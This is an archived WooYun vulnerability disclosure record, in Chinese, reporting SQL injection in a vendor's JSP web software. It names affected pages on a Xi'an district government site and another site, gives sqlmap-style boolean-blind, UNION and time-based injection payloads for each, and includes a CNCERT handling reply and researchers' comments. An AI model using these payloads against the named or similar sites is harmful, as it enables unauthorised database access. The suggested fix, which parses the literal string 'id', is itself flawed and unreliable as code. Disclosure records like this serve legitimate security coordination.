{"id": 55819, "wybug_id": "wooyun-2014-059843", "wybug_title": "某厂商程序存在通用型SQL注入漏洞", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "HackBraid", "wybug_date": "2014-05-08 00:00", "wybug_open_date": "2014-08-06 00:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-06：\t细节向公众公开  简要描述： RT 详细说明：  技术支持：西安恩科网络注入参数：id，nid,LeadXx波及站点：1.http://www.yanta.gov.cn/english/Information.jsp?id=1170&fid=1196&nid=11962.http://www.yanta.gov.cn/gpw/hdjl/ldxx.jsp?flag=3&LeadXx=&pageCurrent=13.http://www.xachanba.com.cn/front/search/search_detail.jsp?id=5961&nid=7374.http://www.xachanba.com.cn/front/zxft/zxftviewEv.go?id=6... ...   漏洞证明：  1.http://www.yanta.gov.cn/english/Information.jsp?id=1170&fid=1196&nid=1196\nPlace: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1170 AND 5833=5833&fid=1196&nid=1196---web application technology: JSPback-end DBMS: Microsoft SQL Server 2005\n2.http://www.yanta.gov.cn/gpw/hdjl/ldxx.jsp?flag=3&LeadXx=&pageCurrent=1\nPlace: GETParameter: LeadXx    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: flag=3&LeadXx= AND 4692=4692&pageCurrent=1    Type: UNION query    Title: Generic UNION query (NULL) - 8 columns    Payload: flag=3&LeadXx=-1217 UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(118)+CHAR(109)+CHAR(117)+CHAR(113)+CHAR(99)+CHAR(86)+CHAR(106)+CHAR(115)+CHAR(68)+CHAR(89)+CHAR(68)+CHAR(98)+CHAR(85)+CHAR(118)+CHAR(113)+CHAR(104)+CHAR(110)+CHAR(108)+CHAR(113),NULL,NULL,NULL,NULL,NULL-- &pageCurrent=1    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: flag=3&LeadXx= AND 9335=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)&pageCurrent=1---web application technology: JSPback-end DBMS: Microsoft SQL Server 2005\n3.http://www.xachanba.com.cn/front/search/search_detail.jsp?id=5961&nid=737\nPlace: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=5961 AND 7367=7367&nid=737---web application technology: JSPback-end DBMS: Microsoft SQL Server 2000\n4.http://www.xachanba.com.cn/front/zxft/zxftviewEv.go?id=6\nPlace: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=6 AND 8554=8554---back-end DBMS: Microsoft SQL Server 2000\n   修复方案：  数字型参数id,nid.LeadXx修复方案为：在接收参数id,nid,LeadXx时，对其进行强制整型转换即可。以id参数为例，int id= Integer.parseInt(\"id\") ;//对id整型转换后再进行下一步的数据库查询更安全   版权声明：转载请注明来源 HackBraid@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-05-11 16:05 厂商回复： CNVD确认并复现所述情况，转由CNCERT下发陕西分中心协调处置。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-21 01:24 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  我靠，黑阔啊~~记得以前你在我某漏洞评论的时候你才100多rank啊，好久没玩这个了，上来看看，你竟然500rank了！！吊炸天啊你！！    \n     2014-06-02 23:02 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  同一个厂商的系统，不同系统也不同页面也可以算通用？@疯狗    \n     2014-06-03 01:11 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 不管同不同一厂商，只要cms或者说系统的名字不一样，内容有差别，应该也算通用的，就比如，DZ一直都是做论坛的，下回他来个网店系统，你发现BUG，你说算通用的吗？    \n     2014-06-03 09:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mosuan 你没明白我说的意思。    \n     2014-06-03 10:08 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 我自己在看看你说的，我都凌乱了，是不是同一系统，不同的页面？比如index.php存在注入，news.php也存在？你是问这样算不算通用的？    \n     2014-06-03 10:10 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mosuan 你看看上面这个漏洞细节再说吧    \n     2014-06-03 10:34 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 他rank比我高……我看不见    \n     2014-06-03 10:40 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mosuan 其实他是把可能不通用的系统（有可能是定制开发）的不同页面的SQL说是通用的，不过都是一个厂商的。我就觉得奇怪所以才想问问狗哥。    \n     2014-06-03 12:19 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 我来艾特狗哥，正好我也有事问他    \n     2014-06-03 12:22 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @疯狗 狗哥请回答上面的问题，再问你一个问题，大厂商流程是如何定义的？影响大？ WooYun: 某人事网系统多处sql注入(这个系统注册跟登录是需要身份证跟名字的,影响多大你懂的！！)   这个是人事网系统的注入，为什么还走小厂商流程？你去看看那些大厂商流程的，几乎都是cnvd给的10-12rank，这个人事网的cnvd给了15rank，这还不能说明影响大？    \n     2014-06-03 12:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mosuan 人事的影响挺大，但是如果是通用的话会按用户量来算好像    \n     2014-06-03 13:06 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 狗哥说的无限制举例，我都做了啊    \n     2014-06-03 17:19 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @Mosuan  具体只能等狗哥了，他回家结婚了    \n     2014-06-03 17:23 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @wefgod 狗哥结婚了？他设计的衣服？我擦……    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}